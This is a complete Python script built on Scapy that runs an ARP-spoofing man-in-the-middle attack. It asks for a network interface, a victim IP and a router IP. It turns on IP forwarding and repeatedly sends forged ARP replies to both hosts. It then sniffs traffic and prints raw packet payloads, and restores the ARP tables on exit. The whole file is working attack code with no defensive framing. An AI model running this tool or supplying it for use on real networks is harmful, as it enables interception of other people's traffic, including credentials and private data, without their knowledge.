import os
import sys
from scapy.all import *

interface = input("interface: \n")
victimip = input("victim: \n")
routerip = input("router: \n")

def MACget(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def spoof(routerip, victimip):
    routermac = MACget(routerip)
    victimmac = MACget(victimip)
    send(ARP(op = 2, pdst= victimip, psrc= routerip, hwdst = victimmac))
    send(ARP(op = 2, pdst= routerip, psrc= victimip, hwdst = routermac))

def restore(routerip, victimip):
    routermac = MACget(routerip)
    victimmac = MACget(victimip)
    send(ARP(op = 2, pdst= routerip, psrc= victimip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimmac), count = 4)
    send(ARP(op = 2, pdst= victimip, psrc= routerip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= routermac), count = 4)

def sniffer():
    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n%Raw.load% \n\n Receiver: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))

def middleman():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            spoof(routerip, victimip)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            restore(routerip, victimip)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)

if __name__ == "__main__":
    middleman() 

